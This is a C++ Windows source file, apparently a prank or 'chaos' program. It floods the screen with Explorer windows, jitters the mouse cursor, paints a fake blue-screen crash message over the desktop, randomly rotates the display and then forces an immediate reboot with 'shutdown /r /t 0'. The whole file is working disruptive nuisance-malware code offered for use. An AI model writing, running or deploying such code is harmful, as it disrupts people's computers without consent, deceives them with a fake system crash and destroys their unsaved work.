#include <windows.h>
#include <winuser.h>
#include <shellapi.h>
#include <cstdlib>
#include <ctime>
#include <vector>
#include <thread>
#include <chrono>

bool CHAOS_MODE = true;

void RotateScreen(int angle) {
    DEVMODE dm;
    dm.dmSize = sizeof(DEVMODE);
    dm.dmFields = DM_DISPLAYORIENTATION;
    dm.dmDisplayOrientation = angle;
    ChangeDisplaySettings(&dm, CDS_RESET);
}

void OpenExplorerForever() {
    while (CHAOS_MODE) {
        ShellExecuteW(NULL, L"open", L"explorer.exe", NULL, NULL, SW_SHOWMAXIMIZED);
        std::this_thread::sleep_for(std::chrono::milliseconds(500));
    }
}

void MouseJitter() {
    POINT cursor;
    while (CHAOS_MODE) {
        GetCursorPos(&cursor);
        SetCursorPos(cursor.x + (rand() % 100 - 50), cursor.y + (rand() % 100 - 50));
        std::this_thread::sleep_for(std::chrono::milliseconds(1));
    }
}

void FakeBSOD() {
    HWND hwnd = GetDesktopWindow();
    HDC hdc = GetDC(hwnd);
    RECT rect;
    GetClientRect(hwnd, &rect);

    while (CHAOS_MODE) {
        FillRect(hdc, &rect, (HBRUSH)GetStockObject(BLACK_BRUSH));
        SetTextColor(hdc, RGB(255, 255, 255));
        SetBkMode(hdc, TRANSPARENT);
        DrawTextW(hdc, L":( Your PC ran into a problem and needs to restart.", -1, &rect, DT_CENTER | DT_VCENTER | DT_SINGLELINE);
        std::this_thread::sleep_for(std::chrono::seconds(3));
    }
}

void ForceReboot() {
    system("shutdown /r /t 0");
}

int main() {
    srand(static_cast<unsigned int>(time(NULL)));

    std::vector<std::thread> chaosThreads;
    chaosThreads.emplace_back(OpenExplorerForever);
    chaosThreads.emplace_back(MouseJitter);
    chaosThreads.emplace_back(FakeBSOD);

    for (int i = 0; i < 10; i++) {
        RotateScreen(rand() % 4);
        std::this_thread::sleep_for(std::chrono::seconds(1));
    }

    ForceReboot();

    for (auto& t : chaosThreads) {
        t.detach();
    }

    return 0;
}
